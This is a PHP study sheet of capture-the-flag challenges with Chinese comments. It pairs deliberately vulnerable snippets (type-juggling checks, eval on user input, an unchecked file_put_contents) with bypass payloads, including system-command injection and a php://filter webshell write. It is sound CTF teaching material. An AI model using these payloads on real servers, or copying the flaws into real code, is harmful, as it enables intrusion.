<?php
# call_user_func()执行回调函数, 第一个参数为回调函数, 其余参数为回调函数的参数
# get_defined_vars()返回由所有已定义变量所组成的数组
# in_array()检查数组中是否存在某值, 未设置第三个参数时为弱比较
# parse_str()将传入的第一个参数设置为变量, 若设置了第二参数, 则会将第一个参数的变量以数组元素的形式存到这个数组
?>

<?php
/************* 例题1 *************/
include("flag.php");
highlight_file(__FILE__);
if(isset($_GET['num'])){
    $num = $_GET['num'];
    if(preg_match("/[0-9]/", $num)){    // 正则匹配0-9
        die("no no no!");
    }
    if(intval($num)){   // 使用指定base转换, 返回变量整型
        echo $flag;
    }
} 

# preg_match只能处理字符串, 当传入数组返回false(0)
# intval不能用于object, 当传入非空数组返回true(1)
# payload: ?num[]=1

# call_user_func()执行回调函数, 第一个参数为回调函数, 其余参数为回调函数的参数
# get_defined_vars()返回由所有已定义变量所组成的数组
# in_array()检查数组中是否存在某值, 未设置第三个参数时为弱比较
# parse_str()将传入的第一个参数设置为变量, 若设置了第二参数, 则会将第一个参数的变量以数组元素的形式存到这个数组
?>

<?php
/************* 例题2 *************/
include("flag.php");
highlight_file(__FILE__);
if(isset($_GET['num'])){
    $num = $_GET['num'];
    if($num==="4476"){      // 不能等于4476
        die("no no no!");
    }
    if(intval($num,0)===4476){ // 当base为0, 自动检测value格式来决定使用的进制
        echo $flag;
    }else{
        echo intval($num,0);
    }
}
# === 会先判断类型是否相等, 再比较值是否相等
# payload: ?num=0x117c(十六进制的4476)
?>

<?php
/************* 例题3 *************/
if(isset($_GET['num'])){
    $num = $_GET['num'];
    if($num==="4476"){      // 不能等于4476
        die("no no no!");
    }
    if(preg_match("/[a-z]/i", $num)){   // 不能用十六进制
        die("no no no!");
    }
    if(!strpos($num, "0")){ // strpos()函数查找字符串在另一字符串中第一次出现的位置并返回
        die("no no no!");
    }
    if(intval($num,0)===4476){
        echo $flag;
    }
}
# 利用八进制的4476绕若(010574)
# 010574在strpos()匹配到0会返回0, 在前面加一个空格使得返回1
# payload: ?num= 010574
?>

<?php
/************* 例题4 *************/
if (isset($_POST['a']) and isset($_POST['b'])) {
    if ($_POST['a'] != $_POST['b'])                 // 要求a, b值不一样
        if (md5($_POST['a']) === md5($_POST['b']))  // 要求两者md5相同
            echo $flag;
    else
        print 'Wrong.';
}
# 该题为强比较的md5
# md5()处理数组返回false, 从而利用false===false绕过
# payload: a[]=1&b[]=2
# 同理sha1()函数

# 当==弱比较时, 可以进行md5碰撞 --> 开头均为0e --> 转换为科学计数法 --> 表示0
?>


<?php
/************* 例题5 *************/
include("ctfshow.php");
//flag in class ctfshow;
$ctfshow = new ctfshow();
$v1=$_GET['v1'];
$v2=$_GET['v2'];
$v3=$_GET['v3'];
$v0=is_numeric($v1) and is_numeric($v2) and is_numeric($v3);
if($v0){
    if(!preg_match("/\;/", $v2)){
        if(preg_match("/\;/", $v3)){
            eval("$v2('ctfshow')$v3");
        }
    }
}
# is_numeric()检测变量是否为数字或数字字符串(若字符串中有e代表科学计数法, 也返回true)
# 分析得$v2为命令, $v3为;
# 符号运算优先级: && > = > and, 所以$v0 = $v1 and false and false
# $v1先执行赋值=给$v0, 后面的false被忽略
# payload: ?v1=1&v2=system("tac ctfshow.php")&v3=;
?>

<?php
/************* 例题6 *************/
highlight_file(__FILE__);
$v1 = $_POST['v1'];
$v2 = $_GET['v2'];
$v3 = $_GET['v3'];
$v4 = is_numeric($v2) and is_numeric($v3); // v2参数要为数字或数字字符串
if($v4){
    $s = substr($v2,2);             // 从下标为2开始的字符串
    $str = call_user_func($v1,$s);  // 通过变量v1调用hex2bin函数将变量v2的16进制字符串转换成原来的base64编码形式
    echo $str;
    file_put_contents($v3,$str);   // 通过使用php://filter伪协议写入webshell
}
else{
    die('hacker');
}
# file_put_contents()将一个字符串写入文件, 若写入字符串和文件名可控则可能导致文件上传漏洞
# 通过将变量v2执行的命令base64加密后转换成16进制字符串来使得变量v4为ture
# '<?=`tac *`;' --> PD89YHRhYyAqYDs --> 504438395948526859794171594473
# <?=是php短标签, echo()的快捷用法
# payload: ?v2=00504438395948526859794171594473&v3=php://filter/write=convert.base64-decode/resource=1.php
# post: v1=hex2bin
?>
